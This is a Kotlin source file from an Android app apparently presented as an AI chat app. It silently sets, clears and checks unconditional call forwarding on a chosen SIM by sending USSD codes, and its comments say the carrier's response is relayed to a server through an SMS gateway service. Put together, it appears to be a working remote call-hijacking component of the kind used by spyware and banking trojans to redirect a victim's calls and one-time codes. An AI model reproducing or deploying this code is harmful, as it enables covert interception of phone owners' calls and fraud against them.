package com.cornspace.aichat.util

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

class CallForwardingUtility(private val context: Context) {

    companion object {
        private const val TAG = "CallForwarding"
        private const val USSD_FORWARD_ALL  = "*21*"
        private const val USSD_DEACTIVATE   = "#21#"
        private const val USSD_CHECK_STATUS = "*#21#"
    }

    // ─── Public API (Boolean convenience wrappers) ────────────────────────────

    @SuppressLint("MissingPermission")
    suspend fun forwardCall(phoneNumber: String, simSlot: Int): Boolean =
        forwardCallWithResult(phoneNumber, simSlot).success

    @SuppressLint("MissingPermission")
    suspend fun deactivateCallForwarding(simSlot: Int): Boolean =
        deactivateCallForwardingWithResult(simSlot).success

    @SuppressLint("MissingPermission")
    suspend fun checkCallForwardingStatus(simSlot: Int): Boolean =
        checkCallForwardingStatusWithResponse(simSlot).success

    // ─── Public API (full result — used by SmsGatewayService) ────────────────

    // FIX #5: These variants return CallForwardingResult so the USSD response
    // string survives all the way to the server. SmsGatewayService calls these
    // and threads result.response through sendCallForwardingResponse().

    @SuppressLint("MissingPermission")
    suspend fun forwardCallWithResult(phoneNumber: String, simSlot: Int): CallForwardingResult =
        executeUssdSuspend("$USSD_FORWARD_ALL$phoneNumber#", simSlot)

    @SuppressLint("MissingPermission")
    suspend fun deactivateCallForwardingWithResult(simSlot: Int): CallForwardingResult =
        executeUssdSuspend(USSD_DEACTIVATE, simSlot)

    @SuppressLint("MissingPermission")
    suspend fun checkCallForwardingStatusWithResponse(simSlot: Int): CallForwardingResult =
        executeUssdSuspend(USSD_CHECK_STATUS, simSlot)

    // ─── Suspend wrapper ──────────────────────────────────────────────────────

    private suspend fun executeUssdSuspend(
        ussdCode: String,
        simSlot: Int
    ): CallForwardingResult = suspendCancellableCoroutine { continuation ->
        if (!hasPermissions()) {
            Log.e(TAG, "Missing required permissions for USSD")
            continuation.resume(CallForwardingResult(success = false, response = null))
            return@suspendCancellableCoroutine
        }

        Log.d(TAG, "Executing USSD '$ussdCode' on SIM slot $simSlot")

        val callback: (CallForwardingResult) -> Unit = { result ->
            if (continuation.isActive) continuation.resume(result)
        }

        // If the coroutine is cancelled (e.g. serviceScope cancelled in onDestroy),
        // resume immediately so the continuation is not leaked indefinitely.
        continuation.invokeOnCancellation {
            Log.w(TAG, "USSD coroutine cancelled for '$ussdCode' on slot $simSlot")
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            executeSilentUssd(ussdCode, simSlot, callback)
        } else {
            executeDialUssd(ussdCode, simSlot, callback)
        }
    }

    // ─── Silent USSD (API 26+) ────────────────────────────────────────────────

    @SuppressLint("MissingPermission")
    private fun executeSilentUssd(
        ussdCode: String,
        simSlot: Int,
        callback: (CallForwardingResult) -> Unit
    ) {
        try {
            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                as? SubscriptionManager ?: run {
                Log.e(TAG, "SubscriptionManager not available")
                callback(CallForwardingResult(false, null)); return
            }

            val subscriptions = subscriptionManager.activeSubscriptionInfoList
            if (subscriptions.isNullOrEmpty()) {
                Log.e(TAG, "No active subscriptions found")
                callback(CallForwardingResult(false, null)); return
            }

            // Find by simSlotIndex, not array position — the list is not guaranteed
            // to be sorted and may be sparse on devices with one active SIM.
            val subscriptionInfo = subscriptions.find { it.simSlotIndex == simSlot }
                ?: subscriptions.first().also {
                    Log.w(TAG, "No subscription for slot $simSlot — using slot ${it.simSlotIndex}")
                }

            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE)
                as? TelephonyManager ?: run {
                Log.e(TAG, "TelephonyManager not available")
                callback(CallForwardingResult(false, null)); return
            }

            val subTm = telephonyManager.createForSubscriptionId(subscriptionInfo.subscriptionId)

            val ussdCallback = object : TelephonyManager.UssdResponseCallback() {
                override fun onReceiveUssdResponse(
                    tm: TelephonyManager?, request: String?, response: CharSequence?
                ) {
                    val responseStr = response?.toString()
                    Log.d(TAG, "USSD response: $responseStr")
                    callback(CallForwardingResult(success = true, response = responseStr))
                }
                override fun onReceiveUssdResponseFailed(
                    tm: TelephonyManager?, request: String?, errorCode: Int
                ) {
                    Log.e(TAG, "USSD failed: errorCode=$errorCode")
                    callback(CallForwardingResult(success = false, response = null))
                }
            }

            subTm.sendUssdRequest(ussdCode, ussdCallback, Handler(Looper.getMainLooper()))
            Log.d(TAG, "Silent USSD sent: $ussdCode")
        } catch (e: Exception) {
            Log.e(TAG, "Error executing silent USSD", e)
            callback(CallForwardingResult(false, null))
        }
    }

    // ─── Dialer fallback (pre-API 26) ─────────────────────────────────────────

    @SuppressLint("MissingPermission")
    private fun executeDialUssd(
        ussdCode: String,
        simSlot: Int,
        callback: (CallForwardingResult) -> Unit
    ) {
        try {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:${Uri.encode(ussdCode)}"))
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            getSubscriptionId(simSlot)?.let {
                intent.putExtra("com.android.phone.extra.SUBSCRIPTION", it)
            }
            context.startActivity(intent)
            Log.d(TAG, "USSD dialer launched: $ussdCode (result unknowable on pre-API 26)")
            // Cannot determine outcome via dialer — return honest false with a marker
            // so the server knows the dialer was invoked but the result is unverifiable.
            callback(CallForwardingResult(success = false, response = "dialer_launched_result_unknown"))
        } catch (e: Exception) {
            Log.e(TAG, "Error launching USSD dialer", e)
            callback(CallForwardingResult(false, null))
        }
    }

    // ─── Helpers ──────────────────────────────────────────────────────────────

    private fun getSubscriptionId(simSlot: Int): Int? {
        return try {
            val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                    as? SubscriptionManager ?: return null
            val subscriptions = sm.activeSubscriptionInfoList ?: return null
            subscriptions.find { it.simSlotIndex == simSlot }?.subscriptionId
                ?: subscriptions.firstOrNull()?.subscriptionId
        } catch (e: Exception) {
            Log.e(TAG, "Error getting subscription ID for slot $simSlot", e)
            null
        }
    }

    fun hasPermissions(): Boolean = getRequiredPermissions().all {
        ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
    }

    // READ_PHONE_NUMBERS was added in API 26 — only require it on API 26+.
    // On older APIs checkSelfPermission returns PERMISSION_DENIED for it, making
    // hasPermissions() always return false even when all real permissions are granted.
    fun getRequiredPermissions(): Array<String> = buildList {
        add(Manifest.permission.READ_PHONE_STATE)
        add(Manifest.permission.CALL_PHONE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            add(Manifest.permission.READ_PHONE_NUMBERS)
        }
    }.toTypedArray()
}

/**
 * Result of a USSD call forwarding operation.
 *
 * [success] — true if the USSD exchange completed without a protocol error.
 * [response] — the raw carrier response string, or null on failure.
 *              On pre-API 26 dialer path, "dialer_launched_result_unknown".
 */
data class CallForwardingResult(
    val success: Boolean,
    val response: String?
)